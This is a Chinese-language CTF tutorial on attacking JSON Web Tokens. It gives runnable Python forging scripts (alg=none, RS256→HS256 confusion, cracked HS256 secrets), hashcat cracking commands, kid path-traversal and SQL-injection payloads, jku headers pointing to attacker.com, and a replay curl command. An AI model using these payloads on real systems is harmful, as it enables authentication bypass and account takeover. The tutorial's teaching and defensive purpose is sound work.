---
title: JWT
date: 2026-07-15
categories: [web安全, 常见漏洞]
recommend: 97
type: tech
---

# JWT 安全

> JWT（JSON Web Token）是 CTF Web 中最常见的令牌格式。攻击的核心不是解码 Payload（任何人都能解码），而是绕过签名验证——不验签名、弱密钥、算法混淆、Header 注入都是常见突破口。

---

## 一、场景

### 1.1 典型场景

JWT（JSON Web Token）是 CTF Web 题目中最常见的身份认证方式之一。典型的场景是：

```
登录成功 → 服务端返回 JWT → 客户端保存 JWT → 访问需鉴权的接口
```

JWT Payload 中保存着身份和权限：

```json
{
  "username": "guest",
  "role": "user",
  "is_admin": false
}
```

攻击者能解码看到内容（只是 Base64URL 编码，没有加密），目标是**修改身份并绕过签名验证**：

```json
{
  "username": "admin",
  "role": "admin",
  "is_admin": true
}
```

### 1.2 JWT 在实战中的位置

| 请求位置 | 示例 | 攻击注意事项 |
|---------|------|------------|
| Authorization Header | `Authorization: Bearer eyJ...` | 最常见的携带位置 |
| Cookie | `Cookie: token=eyJ...` | 可能同时存在于其他位置 |
| URL 参数 | `?token=eyJ...` | 容易在日志中泄露 |
| POST Body | `{"token":"eyJ..."}` | 用于刷新令牌接口 |
| WebSocket | 握手头中携带 | 可能不受 CSRF 保护 |

### 1.3 JWT vs Session Token 对比

| 属性 | JWT | Session Token |
|:----:|:---:|:-------------:|
| 存储位置 | 客户端 | 服务端内存/数据库 |
| 状态性 | 无状态（服务端不存 session） | 有状态（需要查询） |
| 可扩展性 | 跨服务验证（同一密钥） | 需共享 session 存储 |
| 吊销 | 困难（需黑名单或等过期） | 直接删 session |
| 大小 | 较大（含 Payload 和签名） | 小（只有随机 ID） |
| CTF 常见 | 最常见 | 传统模式 |

### 1.4 JWT 安全问题 7 个层面

JWT 安全问题可以分为**7 个层面**，后面按此模型逐一讲解：

| 层面 | 问题 | 攻击类型 |
|:----:|------|---------|
| 1 | 签名验证 | 服务端是否真的验证了签名 |
| 2 | 算法控制 | 攻击者能否篡改 `alg` |
| 3 | 密钥安全 | 密钥是否可爆破或泄露 |
| 4 | Header 注入 | `kid`/`jku`/`jwk`/`x5u` 是否可被控制 |
| 5 | Claim 校验 | `exp`/`nbf`/`iss`/`aud` 是否验证 |
| 6 | 令牌类型混淆 | Access/Refresh/ID Token 是否混用 |
| 7 | 重放攻击 | 同一令牌能否重复使用 |

---

## 二、原理

### 2.1 JWT 三段结构

JWT（JWS 紧凑格式）由三个 Base64URL 编码的部分以 `.` 分隔：

```
Header.Payload.Signature
```

| 部分 | 作用 | 举例 |
|:----:|------|------|
| Header | 算法、令牌类型、密钥标识 | `{"alg":"HS256","typ":"JWT"}` |
| Payload | 身份、权限、过期时间等 | `{"username":"guest","role":"user"}` |
| Signature | 防止篡改 | HMAC 或 RSA 签名结果 |

**解码方式**（Base64URL 不是加密，任何人都能解码）：

```python
import base64, json

token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.xxx"
h_b64, p_b64, s_b64 = token.split(".")

def b64u_decode(s):
    s += "=" * (-len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))

print("Header:", b64u_decode(h_b64))
print("Payload:", b64u_decode(p_b64))
```

### 2.2 JWT 四种格式

| 格式 | 段数 | 用途 | 说明 |
|:----:|:----:|:----:|------|
| JWS 紧凑格式 | 3 段 | 签名令牌 | `Header.Payload.Signature`，最常见 |
| JWE 紧凑格式 | 5 段 | 加密令牌 | 额外包含加密密钥和 IV |
| JWS JSON 序列化 | JSON | 签名令牌（多签名） | 可以包含多个签名 |
| JWE JSON 序列化 | JSON | 加密令牌 | JSON 格式的加密 JWT |

CTF 中 95% 以上使用**JWS 紧凑格式**（3 段式）。

### 2.3 Base64URL vs Base64

| 差异 | Base64 | Base64URL |
|:----:|:------:|:---------:|
| 第 62 字符 | `+` | `-` |
| 第 63 字符 | `/` | `_` |
| 填充符 | `=` (通常保留) | 通常去掉 `=` |
| 用途 | 通用编码 | URL 安全的编码 |
| JWT 中使用 | 否 | 是 |

### 2.4 签名算法分类

| 类型 | 算法 | 签名字钥 | 验签钥匙 | CTF 常见攻击 |
|:----:|:----:|:--------:|:--------:|-------------|
|**对称**| HS256/HS384/HS512 | 同一密钥 | 同一密钥 | 弱密钥爆破 |
|**非对称**| RS256/RS384/RS512 | 私钥(保密) | 公钥(公开) | 算法混淆、jku/jwk 注入 |
|**非对称 (PSS)**| PS256/PS384/PS512 | 私钥(保密) | 公钥(公开) | 同 RS，签名格式不同 |
|**非对称 (ECDSA)**| ES256/ES384/ES512 | EC 私钥 | EC 公钥 | 可能密钥泄露 |
|**非对称 (EdDSA)**| EdDSA | 私钥 | 公钥 | 较新，CTF 少见 |
|**无**| none | 无 | 无 | `alg=none` 绕过 |

**对称 vs 非对称的密钥管理**：

| 特性 | 对称 (HS) | 非对称 (RS/PS/ES) |
|:----:|:---------:|:-----------------:|
| 密钥数量 | 1 个（共享） | 2 个（私钥+公钥） |
| 密钥分发 | 挑战性大 | 私钥保密，公钥公开 |
| 验证端 | 需要知道密钥 | 只需要公钥 |
| 性能 | 快速 | 较慢（尤其是签名） |
| CTF 弱密钥爆破 |  常见 |  不常见（私钥不公开） |

---

## 三、实战：6 步攻击思维模型

拿到 JWT 后，按照以下流程系统地分析：

```
拿到 JWT
  │
  ├── 步骤 ①：签名验证是否存在？
  │     ├─ 直接修改 Payload，保留原签名 → 成功 = 无验证
  │     └─ 失败 → 进入步骤 ②
  │
  ├── 步骤 ②：算法能否被篡改？
  │     ├─ 改成 "alg": "none" → 成功 = none 绕过
  │     ├─ 对称改非对称混淆 → 成功 = 算法混淆
  │     └─ 失败 → 进入步骤 ③
  │
  ├── 步骤 ③：密钥是否可获取或爆破？
  │     ├─ HS 系列 → 字典爆破密钥
  │     ├─ 源码泄露 / Git 泄露 → 直接获取密钥
  │     └─ 失败 → 进入步骤 ④
  │
  ├── 步骤 ④：Header 注入点？
  │     ├─ kid → 路径穿越 / SQL 注入
  │     ├─ jku → 自建 JWKS 服务器
  │     ├─ jwk → 直接嵌入公钥
  │     ├─ x5u → 证书 URL 注入
  │     └─ 失败 → 进入步骤 ⑤
  │
  ├── 步骤 ⑤：Claim 校验是否完整？
  │     ├─ exp 不检查 → 永不过期
  │     ├─ nbf 不检查 → 使用未来令牌
  │     ├─ iss/aud 不检查 → 跨系统冒用
  │     └─ 失败 → 进入步骤 ⑥
  │
  ├── 步骤 ⑥：令牌类型混淆？
  │     ├─ Access Token 当 Refresh Token 用
  │     ├─ ID Token 当 Access Token 用
  │     └─ 失败 → 进入步骤 ⑦
  │
  └── 步骤 ⑦：能否重放？
        ├─ 已有合法令牌 → 直接复用
        └─ 令牌泄露 → 窃取后重放
```

---

### 步骤 ①：签名验证是否存在

#### 【场景】服务端只解码 Payload，不验证签名。

```python
# 危险写法：关闭了签名验证
payload = jwt.decode(
    token,
    options={"verify_signature": False}
)
```

#### 【实战】直接修改 Payload，保留原签名。

```python
import base64, json

tok = "原JWT字符串"
h_b64, p_b64, s_b64 = tok.split(".")

# 解码并修改 Payload
def b64u_decode(s):
    s += "=" * (-len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))

payload = json.loads(b64u_decode(p_b64))
payload["role"] = "admin"

# 重新编码
def b64u_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

new_payload = b64u_encode(
    json.dumps(payload, separators=(",", ":")).encode()
)

new_token = f"{h_b64}.{new_payload}.{s_b64}"
print(new_token)
```

#### 【判断有无签名验证的测试流程】

| 测试 | 操作 | 预期结果（未验证） | 预期结果（已验证） |
|:----:|:----:|:-----------------:|:-----------------:|
| 1 | 修改 payload 中的 username | 访问接口返回新身份 | 返回 401/403 |
| 2 | 修改 payload 的 role 为 admin | 获取到管理员功能 | 返回 401/403 |
| 3 | 随便改签名最后几个字符 | 请求仍然通过 | 返回 401/403 |
| 4 | 删除签名部分，只剩 Header.Payload. | 请求仍然通过 | 解析失败 |

 **新手避坑**：修改后成功不代表破解了签名，很可能只是服务器压根没验证。

 **新手避坑**：如果改了 Payload 后服务端没有任何反应，除了检查签名验证外，还要确认是否改对了令牌位置（Header vs Cookie vs URL 参数）。

 **新手避坑**：有些题目会同时验证多个位置的 JWT，例如 Authorization 头里的和 Cookie 里的。修改其中一个可能还不够，需要同时修改所有位置。

---

### 步骤 ②：算法能否被篡改

#### 2.1 `alg=none` 无签名绕过

#### 【场景】服务端接受 `alg: none`，跳过签名验证。

```json
{"alg": "none", "typ": "JWT"}
```

#### 【原理】JWT 标准中 `none` 算法表示不使用签名。如果服务端库直接信任 Header 中的算法声明，攻击者可绕过验证。

#### 【实战】生成无签名 JWT：

```python
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"username": "admin", "role": "admin"}

def enc(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

# 注意：最后仍然有一个点
token = f"{enc(header)}.{enc(payload)}."
print(token)
```

**大小写变体**（不一定通用）：`None`、`NONE`、`nOnE`、`NoNe`

#### 【各库对 none 的处理方式】

| 库 | 默认拒绝 none？ | 配置方式 |
|:---:|:--------------:|---------|
| PyJWT 2.x |  | 必须显式允许 |
| firebase/php-jwt |  | - |
| node-jsonwebtoken |  | - |
| golang-jwt |  | 默认白名单 |
| jjwt (Java) |  | - |

 **新手避坑**：
- `none` 绕过后，JWT 结尾**必须保留一个 `.`**
- 现代 JWT 库通常拒绝 `none`，需要明确配置 `{"alg": ["HS256"]}` 来防御
- 只删除 Signature 而不改 `alg` 是另一回事
- 不同库对 `None`、`NONE` 等大小写变体的处理不同

 **新手避坑**：不同库对大小写变体的处理不同。有些库将 `None`、`NONE`、`nOnE` 视为不同的算法名，有些则统一处理为 `none`。测试时应当逐一尝试所有形式。

 **新手避坑**：如果服务器同时使用多个 JWT 库（如一个用于签名，另一个用于验证），它们对标准/非标准行为的处理差异可能产生额外的绕过空间。

#### 2.2 RS256 → HS256 算法混淆

#### 【场景】服务端混用对称和非对称算法，且**公钥公开**。

```
原：alg=RS256, 验签用 RSA 公钥
改：alg=HS256, 把 RSA 公钥内容当 HMAC 密钥
```

#### 【原理】当服务端验证签名时，根据 JWT Header 中的 `alg` 选择验证算法。如果攻击者将 `RS256` 改为 `HS256`，而服务端错误地将 RSA 公钥（公开的）当作 HMAC 密钥传递给验证函数，攻击者就可以用公钥内容生成合法的 HS256 签名。

#### 【实战】获取公钥后以 HS256 伪造令牌。

```python
import base64, hashlib, hmac, json

# 读取公开的 RSA 公钥
with open("public.pem", "rb") as f:
    public_key = f.read()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "admin", "role": "admin", "is_admin": True}

def b64u_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

h_b64 = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
p_b64 = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())

signing = f"{h_b64}.{p_b64}".encode()
signature = hmac.new(public_key, signing, hashlib.sha256).digest()
sig_b64 = b64u_encode(signature)

token = f"{h_b64}.{p_b64}.{sig_b64}"
print(token)
```

**获取公钥的常见位置**：

| 路径 | 说明 |
|------|------|
| `/public.pem` | 根目录直接访问 |
| `/static/public.pem` | 静态资源目录 |
| `/.well-known/jwks.json` | 标准 JWKS 端点 |
| `/jwks.json` | 自定义端点 |
| 源码/Git 泄露 | 配置文件或注释 |
| 错误信息 | 某些错误会泄露公钥内容 |
| `/.env` | 环境变量文件 |
| API 文档 | 开发文档中可能包含测试密钥 |

#### 【算法混淆成功 checklist】

- [ ] 原 JWT 使用非对称算法（RS256/RS384/RS512）
- [ ] 能获取到服务端验证时使用的公钥
- [ ] 服务端没有固定算法白名单
- [ ] 服务端把对称和非对称算法混合处理
- [ ] 公钥内容完整（含 `-----BEGIN PUBLIC KEY-----`）

 **新手避坑**：
- 公钥公开本身不是漏洞，漏洞在**把公钥当 HMAC 密钥用**
- 新版 PyJWT 会阻止 PEM 用于 HS256，但目标服务器可能仍存在漏洞
- 验证时注意公钥文件的完整内容（包括 `-----BEGIN PUBLIC KEY-----`）

---

### 步骤 ③：密钥是否可获取或爆破

#### 【场景】HS 系列对称算法，密钥较弱或可获取。

```
token = jwt.encode(payload, "secret123", algorithm="HS256")
```

#### 【原理】HS256 使用同一个密钥签名和验证。如果密钥是弱口令，攻击者可以在本地计算 HMAC 并比对，无需向服务器发送大量请求。

#### 【实战一：字典爆破 HS 密钥】

```bash
# 将完整 JWT 保存到 token.txt
hashcat -m 16500 token.txt rockyou.txt

# 查看结果
hashcat -m 16500 token.txt --show
```

**常见弱密钥来源**：

| 来源 | 示例 |
|------|------|
| 常见密码 | `123456`, `secret`, `password`, `admin` |
| JWT 相关 | `jwtsecret`, `jwttoken`, `hs256` |
| CTF 常见 | `ctf`, `flag`, `key`, `test` |
| 源码硬编码 | `$secret = "hardcoded-key";` |
| Docker 环境变量 | `JWT_SECRET=default_value` |
| .env 文件 | 配置文件中的默认值 |
| 题目名称/域名 | `chzu-ctf-2026` |
| 用户/应用名 | `admin`, `root`, `app` |

#### 【实战二：使用 Python 手工爆破 HS256】

```python
import base64, hashlib, hmac, json

jwt_token = "eyJh...原JWT"
h_b64, p_b64, sig_b64 = jwt_token.split(".")
signing_input = f"{h_b64}.{p_b64}".encode()
target_sig = base64.urlsafe_b64decode(sig_b64 + "===")

def b64u_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# 尝试字典中的每个密钥
with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        secret = line.rstrip("\r\n").encode()
        computed = hmac.new(secret, signing_input, hashlib.sha256).digest()
        if computed == target_sig:
            print(f"[+] 密钥找到: {secret.decode()}")
            break
```

#### 【实战三：用密钥伪造 HS256 令牌】

```python
import jwt, time

secret = "爆破出的密钥"

payload = {
    "username": "admin",
    "role": "admin",
    "is_admin": True,
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}

token = jwt.encode(payload, secret, algorithm="HS256",
                   headers={"kid": "key-1"})  # 保留原始 Header
print(token)
```

#### 【实战四：手工计算 HS256（不依赖 PyJWT）】

```python
import base64, hashlib, hmac, json

secret = b"爆破出的密钥"
header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "admin", "role": "admin"}

def b64u_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

h_b64 = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
p_b64 = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())

signing_input = f"{h_b64}.{p_b64}".encode()
signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
sig_b64 = b64u_encode(signature)

token = f"{h_b64}.{p_b64}.{sig_b64}"
print(token)
```

#### 【密钥爆破速度对比（不同算法）】

| 算法 | 模式号 | Hashcat 速度 (RTX 4090) | 说明 |
|:----:|:-----:|:----------------------:|------|
| HS256 | 16500 | ~50 亿/秒 | 极快 |
| SHA-256 | 1400 | ~100 亿/秒 | 无 HMAC 开销 |
| bcrypt | 3200 | ~10 万/秒 | 极慢（设计如此） |
| scrypt | 8900 | ~10 万/秒 | 内存硬函数 |

 **新手避坑**：
- Hashcat 模式 `-m 16500` 只用于 HS 系列，不能爆破 RS 私钥
- 注意 JSON 中 `separators=(",", ":")` 去掉空格，否则签名不同
- 字段顺序变化也会导致签名不同
- 手工验证时确保 `base64.urlsafe_b64decode` 正确处理填充

---

### 步骤 ④：Header 注入点

#### 4.1 `kid` 路径穿越

#### 【场景】服务器根据 `kid` 读取文件作为密钥。

```python
key_path = "/app/keys/" + header["kid"]
key = open(key_path, "rb").read()
```

#### 【原理】`kid`（Key ID）用于告诉服务器使用哪个密钥。如果直接将 `kid` 拼接到文件路径，攻击者可以突破目录限制。

#### 【实战：指向 /dev/null 使密钥为空】

```json
{"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}
```

Linux 中 `/dev/null` 读取为空，空字节作为 HMAC 密钥：

```python
import hmac, hashlib
signature = hmac.new(b"", signing_input, hashlib.sha256).digest()
```

**成功条件**：
1. `kid` 直接拼接到文件路径，无过滤
2. 路径穿越没有被过滤
3. 服务器成功读取 `/dev/null`（Linux）或 `NUL`（Windows）
4. 读取结果被直接当作密钥
5. 空密钥被允许使用

#### 【实战：指向 /etc/passwd 获知密钥内容】

```json
{"alg": "HS256", "typ": "JWT", "kid": "../../../../etc/passwd"}
```

如果密钥变为 `/etc/passwd` 的第一行内容，且攻击者知道 `/etc/passwd` 的内容，可以还原密钥并伪造令牌。

#### 【kid 注入类型汇总】

| 注入类型 | payload | 效果 |
|---------|---------|------|
| 路径穿越 | `../../../../dev/null` | 空密钥 |
| 路径穿越 | `../../../../etc/passwd` | 已知内容的密钥 |
| SQL 注入 | `' OR 1=1 --` | 返回第一个密钥 |
| NoSQL 注入 | `{"$ne": ""}` | MongoDB 中匹配非空 |
| Redis 命令 | `\r\nGET key-name\r\n` | 命令注入（罕见） |
| 空值 | 删除 `kid` 字段 | 使用默认密钥 |

#### 4.2 `kid` SQL/NoSQL 注入

```sql
SELECT secret FROM jwt_keys WHERE kid = '用户输入'
```

**SQLite 注入**：

```json
{"kid": "' UNION SELECT 'custom_key' --"}
```

**MySQL 注入**：

```json
{"kid": "' UNION SELECT 'custom_key' -- "}
```

**MongoDB NoSQL 注入**（当 `kid` 作为 JSON 对象传入时）：

```json
{"kid": {"$gt": ""}}
```

#### 4.3 `jku` 自建 JWKS 服务器

#### 【场景】服务器信任 JWT Header 中的 `jku` 字段，从该 URL 获取公钥。

#### 【原理】`jku`（JWK Set URL）指向一个包含公钥集合的 JSON 端点。如果服务端无条件相信攻击者提供的 URL，攻击者可以托管自己的公钥。

#### 【实战】攻击者搭建自己的 JWKS 服务器。

```bash
# 生成 RSA 密钥对
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out private.pem
openssl pkey -in private.pem -pubout -out public.pem
```

```python
# 生成 JWK 和伪造 JWT
import json, jwt
from jwt.algorithms import RSAAlgorithm

with open("private.pem", "rb") as f:
    private_key = f.read()
with open("public.pem", "rb") as f:
    public_key = f.read()

# 生成 JWK
jwk = json.loads(RSAAlgorithm.to_jwk(public_key))
jwk["kid"] = "ctf-key"
jwk["alg"] = "RS256"

# 保存 jwks.json
with open("jwks.json", "w") as f:
    json.dump({"keys": [jwk]}, f)

# 生成伪造 JWT
headers = {"kid": "ctf-key", "jku": "https://attacker.com/jwks.json"}
payload = {"username": "admin", "role": "admin", "is_admin": True}
token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(token)
```

**完整的 jwks.json 格式**：

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "ctf-key",
      "use": "sig",
      "alg": "RS256",
      "n": "0vx7agoebGcQSuu...（Base64URL 编码的模数）",
      "e": "AQAB"
    }
  ]
}
```

**注意事项**：即使不能伪造 JWT，任意 `jku` 也可能造成**SSRF**——目标服务器会根据用户提供的 URL 发起 HTTP 请求。

#### 4.4 `jwk` 直接嵌入公钥

#### 【场景】服务器接受 Header 中直接携带的公钥。

```json
{
  "alg": "RS256",
  "kid": "ctf-key",
  "jwk": {
    "kty": "RSA",
    "n": "攻击者公钥模数",
    "e": "AQAB"
  }
}
```

攻击者用自己私钥签名，让服务器用自己提供的公钥验证。

```python
headers = {"kid": "ctf-key", "jwk": jwk}
token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
```

**完整 JWK 流程生成脚本**：

```python
import json, jwt
from jwt.algorithms import RSAAlgorithm

# 生成密钥对
private_key = """-----BEGIN RSA PRIVATE KEY-----
...（base64 编码的私钥）...
-----END RSA PRIVATE KEY-----"""

public_key = """-----BEGIN PUBLIC KEY-----
...（base64 编码的公钥）...
-----END PUBLIC KEY-----"""

# 将公钥转为 JWK
jwk = json.loads(RSAAlgorithm.to_jwk(public_key.encode()))
jwk["kid"] = "attacker-key"

# 伪造 JWT，把 jwk 放 Header 里
headers = {"kid": "attacker-key", "jwk": jwk}
payload = {"username": "admin", "role": "admin", "is_admin": True}
token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(token)
```

#### 4.5 `x5u` 证书 URL 注入

类似 `jku`，但指向 X.509 证书。

```json
{"alg": "RS256", "x5u": "https://attacker.com/cert.pem"}
```

#### 【Header 注入攻击对比】

| 字段 | 类型 | 攻击方式 | 是否需要出网 | SSRF 风险 |
|:----:|:----:|---------|:-----------:|:---------:|
| kid | string | 路径穿越 / SQL 注入 |  |  |
| jku | URL | 自建 JWKS 服务器 |  |  |
| jwk | JWK 对象 | 嵌入攻击者公钥 |  |  |
| x5u | URL | 自建证书服务器 |  |  |
| x5c | X.509 数组 | 嵌入攻击者证书 |  |  |

`jku`、`jwk`、`x5u` 的共同核心问题：

> 服务器是否信任了攻击者提供的验证密钥或密钥来源。

---

### 步骤 ⑤：Claim 校验是否完整

即使签名验证通过，如果 Claim 校验不完整，仍可绕过。

#### 5.1 `exp` 过期时间

```python
# 跳过过期验证
payload = jwt.decode(token, key, algorithms=["HS256"],
                     options={"verify_exp": False})
```

**常见问题**：

| 问题 | 说明 | 攻击方式 |
|:----:|------|---------|
| 不检查 exp | 服务端完全忽略 exp | 永久有效 |
| 可选检查 | 只在 exp 存在时检查，但删除 exp 后通过 | 删除 exp 字段 |
| 毫秒 vs 秒 | exp 使用毫秒，实际过期是 2099 年 | 看似已过期，实际还没 |
| 字符串格式 | `"exp": "1760000000"`（字符串） | 类型不匹配绕过 |
| 过大偏移 | 允许几分钟的时钟偏移 | 略微延长有效期 |

**篡改思路**：`"exp": 4102444800`（约 2099 年，需有合法签名）

#### 5.2 `nbf` (Not Before)

`nbf` 控制令牌在指定时间之前不可用。不验证则可能提前使用未来令牌。

```
nbf: 1760000000  ← 2025-10-01 之前不可用
如果不检查 nbf，立即使用也能通过
```

#### 5.3 `iss` (Issuer)

不验证 `iss` 时，A 系统签发的令牌可能在 B 系统使用（如果密钥相同）。

| 场景 | 风险 |
|:----:|------|
| 单一密钥多服务 | A 服务签发的 token 可用于 B 服务 |
| 共享密钥池 | 攻击者注册的服务可签发冒充其他服务 |

#### 5.4 `aud` (Audience)

不验证 `aud` 时，发给普通 API 的令牌可用于管理 API。

```json
{
  "aud": "user-api",     ← 原本只用于 user-api
  "admin": true
}
```

如果管理 API `admin-api` 不检查 `aud`，该令牌也可调用。

#### 5.5 `jti` (JWT ID)

仅存在 `jti` 不会自动防止重放，服务器必须**后端记录已用 jti**。

| jti 实现 | 是否防重放 | 说明 |
|:--------:|:---------:|------|
| 只有 jti 字段 |  | 未记录使用状态 |
| 后端记录 + 滑动窗口 |  | 基于时间的检查 |
| 后端黑名单 |  | 每次验证时查询 |
| 短期 exp + jti |  | 缩小窗口但仍有风险 |

---

### 步骤 ⑥：令牌类型混淆

#### 【场景】系统同时使用 Access Token、Refresh Token 和 ID Token，但验证逻辑相同。

#### 【原理】三种令牌的结构都是 JWT，但用途不同。如果服务端仅验证签名而不区分令牌类型，可能被混淆使用。

#### 【三种令牌对比】

| 属性 | Access Token | Refresh Token | ID Token |
|:----:|:-----------:|:-------------:|:--------:|
| 主要用途 | 访问 API | 换取新的 Access Token | 身份标识（OIDC） |
| 有效期 | 短（分钟~小时） | 长（天~月） | 短 |
| 包含信息 | 用户身份+权限 | 无敏感信息 | 用户信息 |
| 典型 `typ` | `at+jwt` | `rt+jwt` | `id_token` |
| 是否可撤销 | 难（依赖过期） | 可（存储撤销列表） | 不适用 |

#### 【类型混淆攻击流程】

```
1. 获得一个 Refresh Token（有效期长）
2. 修改 payload 中的权限字段（如有）
3. 将 Refresh Token 作为 Access Token 发送到 API 接口
4. 如果服务器仅验证签名，不区分令牌类型 → 攻击成功
```

**防御方式**：

```python
# 1. 不同的 typ Claim
headers = {"typ": "at+jwt"}  # Access Token
headers = {"typ": "rt+jwt"}  # Refresh Token

# 2. 不同的 aud
payload = {"aud": "api"}     # Access Token
payload = {"aud": "refresh"} # Refresh Token

# 3. 验证 typ
payload = jwt.decode(token, key, algorithms=["HS256"])
if payload.get("typ") != "at+jwt":
    raise Exception("invalid token type")
```

---

### 步骤 ⑦：重放攻击

JWT 签名只防篡改，不防复制。拿到一个合法令牌就可以直接重复使用。

**常见泄露来源**：

| 来源 | 说明 | 防护 |
|:----:|------|------|
| XSS 窃取 | 脚本读取 LocalStorage/Cookie | HttpOnly Cookie |
| URL 参数 | JWT 出现在 URL 中（日志泄露） | 使用 Header 携带 |
| 不安全的 HTTP | 明文传输被截获 | HTTPS |
| Git 泄露 | 代码库中包含 JWT | .gitignore |
| Bot 请求 | 管理员 Bot 的请求头泄漏 | 短期令牌 |
| Referer 头 | JWT 在 URL 中时 Referer 泄露 | 不在 URL 中携带 |
| 第三方脚本 | 页面中第三方 JS 读取 Storage | 不使用 localStorage |

```bash
# 直接重放管理员 JWT
curl "http://target/admin" -H "Authorization: Bearer 管理员JWT..."
```

`exp` 只能限制重放的时间窗口，不能阻止窗口内的重放。

---

## 四、各语言 / 库常见 JWT 函数对照

### 4.1 完整函数对照表

| 语言/库 | 编码/签名 | 解码/验证 | 安装 |
|---------|----------|----------|------|
|**Python**(PyJWT) | `jwt.encode(payload, key, algorithm=...)` | `jwt.decode(token, key, algorithms=[...])` | `pip install pyjwt` |
|**Python**(PyJWT 不验证) | - | `jwt.decode(token, options={"verify_signature": False})` | pyjwt |
|**Python**(手工 HS256) | `hmac.new(key, data, hashlib.sha256).digest()` | 同上比较 | 标准库 |
|**PHP**(firebase/php-jwt) | `JWT::encode($payload, $key, 'HS256')` | `JWT::decode($token, $key, ['HS256'])` | `composer require firebase/php-jwt` |
|**PHP**(lcobucci/jwt 4.x) | `new IssuedBy()->withClaim(...)->getToken()` | `$parser->parse($token)->claims()` | `composer require lcobucci/jwt` |
|**Node.js**(jsonwebtoken) | `jwt.sign(payload, secret, {algorithm: 'HS256'})` | `jwt.verify(token, secret, {algorithms: ['HS256']})` | `npm install jsonwebtoken` |
|**Node.js**(jose) | `new SignJWT(payload).setProtectedHeader({alg:'HS256'}).sign(secret)` | `jwtVerify(token, key)` | `npm install jose` |
|**Go**(golang-jwt) | `jwt.NewWithClaims(jwt.SigningMethodHS256, claims)` | `jwt.Parse(token, keyFunc)` | Go 标准扩展 |
|**Java**(jjwt 0.12+) | `Jwts.builder().signWith(key).compact()` | `Jwts.parser().verifyWith(key).build().parseClaimsJws(token)` | Maven 依赖 |
|**Ruby**(ruby-jwt) | `JWT.encode(payload, secret, 'HS256')` | `JWT.decode(token, secret, true, {algorithm: 'HS256'})` | `gem install jwt` |
|**Rust**(jsonwebtoken) | `encode(&Header::default(), &claims, &secret)` | `decode::<Claims>(&token, &secret, &Validation::default())` | Cargo 依赖 |

### 4.2 各库常见陷阱

| 库 | 常见陷阱 | 说明 |
|:---:|---------|------|
| PyJWT | `algorithms` 未指定 | 从 Header 读 alg（攻击者可控） |
| firebase/php-jwt | 使用 HTTP 协议获取 jku | 可能被 MitM 攻击 |
| jsonwebtoken (Node) | 未指定 algorithms | 接受任意算法 |
| golang-jwt | keyFunc 未验证算法 | 接收混合算法 |
| jjwt (Java) | 使用旧版 parser() | 不验证 exp 默认 |

### 4.3 PyJWT 常用操作速查

```python
# 仅读取（不验证）
header = jwt.get_unverified_header(token)
payload = jwt.decode(token, options={"verify_signature": False})

# 验证 HS256
payload = jwt.decode(token, secret, algorithms=["HS256"])

# 验证并要求 exp
payload = jwt.decode(token, secret, algorithms=["HS256"],
                     options={"require": ["exp"]})

# 验证 + iss + aud
payload = jwt.decode(token, secret, algorithms=["HS256"],
                     issuer="https://auth.target",
                     audience="admin-api")

# 错误：从 header 中读取 alg 来验证（攻击者可控制）
header = jwt.get_unverified_header(token)
payload = jwt.decode(token, key, algorithms=[header["alg"]])
```

---

## 五、避坑汇总

| 编号 | 坑 | 正确做法 |
|:---:|----|---------|
| 1 | 解码成功 = 令牌合法 | 解码只是 Base64URL，任何人都能解码 |
| 2 | 拿到 JWT 先爆破密钥 | 先测试是否验证签名（改 Payload 不重签） |
| 3 | 改 Payload 后服务端不理 | 可能改错了令牌位置（Header vs Cookie） |
| 4 | `alg=none` 一定能绕过 | 只在库或服务器配置错误时有效 |
| 5 | 公钥泄露 = 密钥泄露 | 非对称算法中公钥公开没事，算法混淆才有事 |
| 6 | `kid` 一定有漏洞 | 正常实现可能是白名单字典 |
| 7 | `jti` 能防重放 | 需要后端保存使用状态才能防 |
| 8 | RS256 JWT 可被爆破 | Hashcat `-m 16500` 只适用于 HS 系列 |
| 9 | 只检查 JWT 签名就够 | 还要检查 exp、nbf、iss、aud |
| 10 | JWT 在 HTTPS 下就安全 | 泄露渠道不止网络截获 |
| 11 | 所有令牌类型都一样 | Access Token、Refresh Token、ID Token 用途不同 |
| 12 | `jku` 只能看不能打 | 即使不能伪造 JWT，`jku` 也可能造成 SSRF |
| 13 | 空密钥肯定被拒绝 | 有些实现允许空密钥（`/dev/null` 绕过） |
| 14 | HS256 密钥长度不重要 | 弱密钥（如 `secret`）可被秒级爆破 |
| 15 | 签名验证=完全安全 | 业务逻辑和 Claim 校验同样重要 |
| 16 | JWT 字段顺序不影响 | JSON 字段顺序改变会导致签名不同 |
| 17 | `kid` 只用于查找密钥 | 还可能拼入 SQL、命令行、路径 |
| 18 | 所有 JWT 库默认安全 | 许多库默认配置存在漏洞 |

---

## 六、知识总结表

### 攻击方法速查

| 攻击方法 | 前提条件 | 难度 | 常用工具 |
|---------|---------|:---:|---------|
| 跳过签名验证 | 服务端 `verify_signature=False` | 低 | Python 手工修改 |
| `alg=none` | 库接受 none 算法 | 低 | Python 手工生成 |
| HS 弱密钥 | HS 系列 + 易猜密钥 | 中 | Hashcat `-m 16500` |
